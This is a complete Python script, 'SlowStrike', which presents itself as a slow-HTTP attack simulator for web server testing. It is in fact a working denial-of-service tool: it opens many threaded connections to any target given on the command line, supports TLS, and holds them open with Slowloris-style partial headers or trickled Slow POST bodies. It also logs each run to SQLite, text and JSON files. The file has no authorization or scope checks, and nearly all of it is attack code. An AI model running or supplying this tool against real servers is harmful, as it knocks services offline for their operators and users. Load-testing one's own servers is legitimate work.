#!/usr/bin/env python3

import argparse
import logging
import sys
import time
import json
import os
import sqlite3
from concurrent.futures import ThreadPoolExecutor
import socket
import random
import ssl
import threading

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('slowstrike.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SlowStrike:
    def __init__(self, target: str, port: int = 80, mode: str = 'slowloris', connections: int = 100,
                 interval: int = 10, duration: int = 60, threads: int = 5, quiet: bool = False):
        self.target = target
        self.port = port
        self.mode = mode
        self.connections = connections
        self.interval = interval
        self.duration = duration
        self.threads = threads
        self.quiet = quiet
        self.output_dir = 'slowstrike-output'
        self.output_file = os.path.join(self.output_dir, 
            f"strike_{time.strftime('%Y%m%d_%H%M%S')}.txt")
        self.json_file = os.path.join(self.output_dir, 
            f"strike_{time.strftime('%Y%m%d_%H%M%S')}.json")
        self.db_file = os.path.join(self.output_dir, 'slowstrike.db')
        os.makedirs(self.output_dir, exist_ok=True)
        self.actions = []
        self.running = True
        self.active_connections = 0
        self.lock = threading.Lock()
        self.init_db()
        if quiet:
            logging.getLogger().handlers = [logging.FileHandler('slowstrike.log')]

    def init_db(self):
        """Initialize SQLite database for storing action logs."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS actions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target TEXT,
                    port INTEGER,
                    mode TEXT,
                    connections INTEGER,
                    status TEXT,
                    timestamp TEXT
                )
            ''')
            conn.commit()

    def store_action(self, status: str):
        """Store action details in database."""
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'INSERT INTO actions (target, port, mode, connections, status, timestamp) '
                'VALUES (?, ?, ?, ?, ?, ?)',
                (self.target, self.port, self.mode, self.active_connections, status, timestamp)
            )
            conn.commit()
        self.actions.append({
            'target': self.target,
            'port': self.port,
            'mode': self.mode,
            'connections': self.active_connections,
            'status': status,
            'timestamp': timestamp
        })

    def create_socket(self):
        """Create and configure a socket with SSL if needed."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            if self.port == 443:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=self.target)
            return sock
        except Exception as e:
            logger.error(f"Socket creation failed: {e}")
            return None

    def slowloris_attack(self, sock):
        """Simulate Slowloris attack by sending partial HTTP headers."""
        try:
            sock.connect((self.target, self.port))
            with self.lock:
                self.active_connections += 1
            sock.send(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
            sock.send(b"User-Agent: Mozilla/5.0 (compatible; SlowStrike/1.0)\r\n")
            start_time = time.time()
            while self.running and (time.time() - start_time) < self.duration:
                sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                time.sleep(self.interval)
            status = f"Slowloris connection to {self.target}:{self.port} completed"
            logger.info(status)
            self.store_action(status)
        except Exception as e:
            status = f"Slowloris connection failed: {e}"
            logger.error(status)
            self.store_action(status)
        finally:
            with self.lock:
                self.active_connections -= 1
            sock.close()

    def slowpost_attack(self, sock):
        """Simulate Slow POST attack by sending partial POST data."""
        try:
            sock.connect((self.target, self.port))
            with self.lock:
                self.active_connections += 1
            content_length = random.randint(1000, 10000)
            sock.send(
                f"POST / HTTP/1.1\r\nHost: {self.target}\r\n"
                f"Content-Length: {content_length}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n\r\n".encode()
            )
            start_time = time.time()
            sent = 0
            while self.running and (time.time() - start_time) < self.duration and sent < content_length:
                chunk = f"data={random.randint(1, 1000)}&".encode()
                sock.send(chunk)
                sent += len(chunk)
                time.sleep(self.interval)
            status = f"Slow POST connection to {self.target}:{self.port} completed, sent {sent} bytes"
            logger.info(status)
            self.store_action(status)
        except Exception as e:
            status = f"Slow POST connection failed: {e}"
            logger.error(status)
            self.store_action(status)
        finally:
            with self.lock:
                self.active_connections -= 1
            sock.close()

    def worker(self):
        """Worker function to manage multiple connections."""
        sockets = []
        try:
            for _ in range(self.connections // self.threads):
                sock = self.create_socket()
                if not sock:
                    continue
                sockets.append(sock)
                if self.mode == 'slowloris':
                    threading.Thread(target=self.slowloris_attack, args=(sock,), daemon=True).start()
                elif self.mode == 'slowpost':
                    threading.Thread(target=self.slowpost_attack, args=(sock,), daemon=True).start()
            start_time = time.time()
            while self.running and (time.time() - start_time) < self.duration:
                time.sleep(1)
        except Exception as e:
            logger.error(f"Worker error: {e}")
        finally:
            for sock in sockets:
                sock.close()

    def run(self):
        """Run SlowStrike to simulate slow HTTP attack."""
        logger.info(f"Starting SlowStrike against {self.target}:{self.port} in {self.mode} mode")
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(self.worker) for _ in range(self.threads)]
                start_time = time.time()
                while self.running and (time.time() - start_time) < self.duration:
                    time.sleep(1)
                self.running = False
                for future in futures:
                    future.result()
        except KeyboardInterrupt:
            logger.info("SlowStrike stopped by user")
            self.running = False
        except Exception as e:
            logger.error(f"Error: {e}")
            self.running = False
        finally:
            self.save_results()

    def save_results(self):
        """Save action logs to files."""
        with open(self.output_file, 'a') as f:
            f.write("=== SlowStrike Results ===\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            for action in self.actions:
                f.write(f"[{action['timestamp']}] {action['status']}, "
                        f"Target={action['target']}:{action['port']}, "
                        f"Mode={action['mode']}, Connections={action['connections']}\n")
        
        with open(self.json_file, 'w') as f:
            json.dump({
                'target': self.target,
                'port': self.port,
                'mode': self.mode,
                'connections': self.connections,
                'duration': self.duration,
                'actions': self.actions,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }, f, indent=4)
        
        logger.info(f"Results saved to {self.output_file} and {self.json_file}")

def main():
    parser = argparse.ArgumentParser(
        description="SlowStrike: Tool to simulate slow HTTP attacks for web server testing.",
        epilog="Example: ./slowstrike.py -t example.com -m slowloris -c 100 -d 60"
    )
    parser.add_argument('-t', '--target', required=True,
                        help="Target hostname or IP address")
    parser.add_argument('-p', '--port', type=int, default=80,
                        help="Target port (default: 80)")
    parser.add_argument('-m', '--mode', choices=['slowloris', 'slowpost'], default='slowloris',
                        help="Attack mode: slowloris or slowpost (default: slowloris)")
    parser.add_argument('-c', '--connections', type=int, default=100,
                        help="Number of concurrent connections (default: 100)")
    parser.add_argument('-i', '--interval', type=int, default=10,
                        help="Interval between sends in seconds (default: 10)")
    parser.add_argument('-d', '--duration', type=int, default=60,
                        help="Attack duration in seconds (default: 60)")
    parser.add_argument('-T', '--threads', type=int, default=5,
                        help="Number of threads (default: 5)")
    parser.add_argument('-q', '--quiet', action='store_true',
                        help="Quiet mode (log to file only)")

    args = parser.parse_args()

    print("""
    ==============================
          SlowStrike v1.0
      Slow HTTP Attack Simulator
    ==============================
    """)

    try:
        strike = SlowStrike(
            target=args.target,
            port=args.port,
            mode=args.mode,
            connections=args.connections,
            interval=args.interval,
            duration=args.duration,
            threads=args.threads,
            quiet=args.quiet
        )
        strike.run()
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()